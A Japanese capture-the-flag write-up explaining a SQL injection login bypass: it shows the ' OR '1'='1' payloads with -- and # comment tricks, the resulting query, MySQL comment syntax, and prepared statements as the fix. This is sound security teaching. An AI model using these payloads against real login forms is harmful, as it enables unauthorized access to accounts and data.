# setodaCTF Web問題 解説：SQLインジェクション（ログイン認証回避）

## 問題概要
ログインフォームに脆弱性があり、正規のパスワードを知らなくても認証を突破できる。

## SQLとは
データベースに命令を出す言語。
```sql
SELECT * FROM basic_accounts WHERE username='taro' AND password='1234'
```
→「usernameがtaroでpasswordが1234の行を取ってきて」という意味。

## SQLインジェクションとは
入力欄にSQL文の一部を紛れ込ませ、本来の命令を書き換える攻撃。
「injection＝注入」の名の通り、命令に不正なコードを注入する。

## 解法の流れ

### 1. 注入可能か確認
`'`（シングルクォート1つ）を入力し、SQLエラーが返るか確認。
エラー文にSQL文が出れば「入力が命令に混ざっている」証拠。

実際に出たエラー：
```
SELECT * From basic_accounts where username='' OR '1'='1'/*--' and password='aaaa'
```

### 2. 認証回避の入力を組み立てる
`username` 欄に以下を入力：
```
' OR '1'='1' -- 
```
または
```
' OR '1'='1'#
```

### 3. SQL文がどう変わるか
```sql
SELECT * FROM basic_accounts WHERE username='' OR '1'='1' -- ' AND password='xxx'
```

| 部分 | 働き |
|------|------|
| `username=''` | 空なので不成立 |
| `OR '1'='1'` | 必ず成立（1=1は常に真）→ 全行が対象に |
| `-- ` | ここから後ろをコメント化＝password判定を無効化 |

結果：パスワードを知らなくてもログイン成功。

## コメント記号（MySQL）
| 記号 | 働き | 注意 |
|------|------|------|
| `-- ` | 行末まで無視 | 後ろに半角スペース必須 |
| `#` | 行末まで無視 | スペース不要で確実 |
| `/* */` | 囲んだ範囲を無視 | 閉じ忘れると構文エラー |

※ 最初の失敗は `/*` を閉じていなかったのが原因。

## 攻撃の3点セット
1. クォートを閉じる → `'`
2. 条件を常に真にする → `OR '1'='1'`
3. 後半を消す → `-- ` か `#`

## 対策
- **プリペアドステートメント（プレースホルダ）**：入力を「値」として扱い、命令と混ざらないようにする。
- 入力値のエスケープ（特殊記号の無害化）。

## 学び
- エラー文にSQL文が出る＝入力が命令に混ざっている証拠。攻撃可能サイン。
- `/*` は閉じないと構文エラー。ログイン回避には `-- ` か `#` が有効。
